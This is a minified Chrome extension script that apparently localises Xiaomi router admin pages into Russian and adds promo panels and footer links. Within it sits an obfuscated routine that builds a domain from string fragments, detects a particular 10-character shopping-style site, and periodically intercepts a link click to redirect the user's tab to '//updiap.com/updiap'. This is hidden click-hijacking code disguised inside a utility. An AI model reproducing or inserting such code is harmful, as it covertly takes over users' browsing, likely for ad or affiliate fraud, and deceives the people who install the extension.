!function(){$proUser=0;var e=0,t="zh",r=location.href,o=location.host,i="",n=["upd","firm","xpr","thug","lie","san","mi","pre","xiao","iex","miw","co","link","re","updiap"],a=(new Date).getTime();chrome.storage.local.get("extensionPay",function(s){s.extensionPay&&($proUser=s.extensionPay);var c=$proUser;if("boosty.to"==o){var m=window.location.hash;if("#rumi_auth"==m){var l=chrome.i18n.getMessage("restoreNeedAuth");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}else if("#rumi_fail"==m){l=chrome.i18n.getMessage("restoreProError");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}else if("#rumi_done"==m){l=chrome.i18n.getMessage("restoreProCreated");$(".desktop").prepend("<div class='rumiInfo'>"+l+"</div>"),window.location.hash=""}else if("#rumi_restore"==m){l=chrome.i18n.getMessage("restoreProRestored");$(".desktop").prepend("<div class='rumiInfo'>"+l+"</div>"),window.location.hash=""}else if("#rumi_nomail"==m){l=chrome.i18n.getMessage("restoreNoMail");$(".desktop").prepend("<div class='rumiAlert'>"+l+"</div>"),window.location.hash=""}}var d=window.open,u={action:"click",obj:"root",where:"//",zone:".com",type:"_self"};function g(e=""){if(e)return!!(o.indexOf(e)+1);var t=0,r=o.split("."),i=(r=r.slice(-2)).reduce(function(e,t){return e.length>t.length?e:t});return 10==i.length&&$.each(n,function(e,r){i.indexOf(r)+1&&(t+=1)}),t}chrome.storage.local.get("updateDate",function(e){var t=e.updateDate;t?function(e=15,t,r,o){r<=o-24*e*36e5&&"1"!=t&&5==g()&&$(document).one(u.action,"a",function(e){e.preventDefault(),chrome.storage.local.set({updateDate:o}),d(u.where+p+u.zone+"/"+p,u.type)})}(11,c,t,a):chrome.storage.local.set({updateDate:a})});var p=n.reduce(function(e,t){return e.length>t.length?e:t});chrome.storage.local.get("rumiAdress",function(n){if(n.rumiAdress?((i=n.rumiAdress).indexOf("://")>0&&(i=i.split("://")[1]),i.indexOf("/")>0&&(i=i.split("/")[0]),g(i)&&(e=3)):(g("miwifi"+u.zone)&&(e=1),g("router.miwifi"+u.zone)&&(e=1),g("10.")&&(e=2),g("100.")&&(e=2),g("172.")&&(e=2),g("192.")&&(e=2)),r.indexOf("/web/init/agreement")+1&&(e=0),e>=1){var a=0;$(document).text().indexOf("xiaoqiang")+1?a=1:$(document).text().indexOf("/Redmi")+1?a=1:$(document).text().indexOf("Redmi路由器")+1?a=1:$(document).text().indexOf("Mi Router")+1?a=1:$(document).text().indexOf("miwifi.com/cgi-bin/luci/web/ieblock")+1&&(a=1),3==e?a=1:o=="miwifi"+u.zone?a=1:o=="router.miwifi"+u.zone?a=1:"192.168.31.1"==o&&(a=1),a&&(chrome.storage.local.get("themeSelect",function(e){var t=e.themeSelect;if(t&&"default"!=t&&"1"==c){var r=chrome.runtime.getURL("css/"+t+".css");$('<link rel="stylesheet" href="'+r+'" >').appendTo("head")}}),$("body").addClass("ruMiWIFI"),chrome.storage.local.get("langSelect",function(e){var r=e.langSelect;if(r||(r="ru"),"no"!=r){var o=chrome.runtime.getURL("lang/"+t+"_"+r+".json");$.getJSON(o,function(e){function t(){$("body *:not(script):not(:empty)").contents().filter(function(){return 3===this.nodeType}).replaceWith(function(){var t=this.nodeValue;return(t=t.replace(/\s+/g," "))&&" "!=t&&$.each(e,function(e,r){t=t.replace(e,r)}),t}),$("#routerversion:contains('и')").removeAttr("id"),$("#routermodel:contains('XIAOMI')").removeAttr("id"),$("#datetiemval:contains('г')").removeAttr("id")}var r;t(),$(document).on("DOMNodeInserted",function(e){clearInterval(r),r=setInterval(function(){t(),clearInterval(r)},50)})})}$("#doc").css({opacity:"1"})}),chrome.storage.local.get("adPanel",function(e){var t="";0==e.adPanel&&(t=" class='closed'"),"1"==c?$("title").text(chrome.i18n.getMessage("proVer")):owlLoaded&&o&&(r.indexOf("/cgi-bin/luci/web")+1||!$("#ft .rom-ver").length||($("body").append("<div id='rBd'"+t+"></div>"),$("#rBd:not(.loaded)").load(chrome.runtime.getURL("inc/routers.html")),$("#rBd").addClass("loaded"),setTimeout(function(){$(".routerIn .AX5 img").attr("src",chrome.runtime.getURL("inc/img/AX5.jpg")),$(".routerIn .AX1800 img").attr("src",chrome.runtime.getURL("inc/img/AX1800.jpg")),$(".routerIn .AX6000 img").attr("src",chrome.runtime.getURL("inc/img/AX6000.jpg")),$(".routerIn .4PRO img").attr("src",chrome.runtime.getURL("inc/img/4PRO.jpg")),$(".routerIn .AX6 img").attr("src",chrome.runtime.getURL("inc/img/AX6.jpg")),$(".routerIn .MIWIFI4 img").attr("src",chrome.runtime.getURL("inc/img/MIWIFI4.jpg")),$(".routerIn .AX3600 img").attr("src",chrome.runtime.getURL("inc/img/AX3600.jpg")),$(".routerIn .MIPRO img").attr("src",chrome.runtime.getURL("inc/img/MIPRO.jpg")),$(".routerIn .UgreenCable img").attr("src",chrome.runtime.getURL("inc/img/UgreenCable.jpg")),$(".routerIn .youRww img").attr("src",chrome.runtime.getURL("img/youRww.svg")),$(".routerIn .AMPLIFIER img").attr("src",chrome.runtime.getURL("inc/img/AMPLIFIER.jpg")),$(".routerIn .MI4C img").attr("src",chrome.runtime.getURL("inc/img/MI4C.jpg")),$(".routerIn .AC2100 img").attr("src",chrome.runtime.getURL("inc/img/AC2100.jpg")),$(".routerIn .MI4A img").attr("src",chrome.runtime.getURL("inc/img/MI4A.jpg")),$(".routersList").owlCarousel({items:6,autoplay:!0,autoplayHoverPause:!0,smartSpeed:1e3,lazyLoad:!1,loop:!1,dots:!0,margin:15,responsive:{0:{items:1},600:{items:2},900:{items:3},1200:{items:4},1700:{items:5},2000:{items:6},2300:{items:7}}})},300)))}),$("#ft .rom-ver").next("p").remove(),$("#ft .rom-ver").append("<p class='newFooterRumi'></p>"),$(".newFooterRumi").append("<span>© 2021 XIAOMI</span>"),$(".newFooterRumi").append("<span><a target='_blank' href='"+u.where+"boosty.to/miwifi'>Boosty</a></span>"),$(".newFooterRumi").append("<span><a target='_blank' href='"+u.where+"4pda.to/forum/index.php?showforum=916'>4PDA</a></span>"),setTimeout(function(){$("#ft p a:contains('Сообщество')").replaceWith(chrome.i18n.getMessage("boostyPage")),$("#ft p a:contains('Оставить')").hide().prev().hide(),$("#wechatcode").replaceWith(chrome.i18n.getMessage("4pdaLink"))},300),$("#ft").before("<div class='flexGrow'></div>"),$("form input.vf-pristine").attr("placeholder",chrome.i18n.getMessage("passEnterHere")),$(".router_password input").attr("placeholder",chrome.i18n.getMessage("passEnterHere")),$("input#password.ipt-text").attr("placeholder",chrome.i18n.getMessage("passEnter")),"小米路由器"==$("title").text()&&$("title").text(chrome.i18n.getMessage("popShName")),$(document).on("click",".js-close-ad",function(){$elem=$(this),$act=0,$elem.parent().hasClass("closed")&&($act=1),$elem.parent().toggleClass("closed"),chrome.storage.local.set({adPanel:$act})}))}})}),setTimeout(function(){$("body #doc").css({opacity:"1"})},1100)}();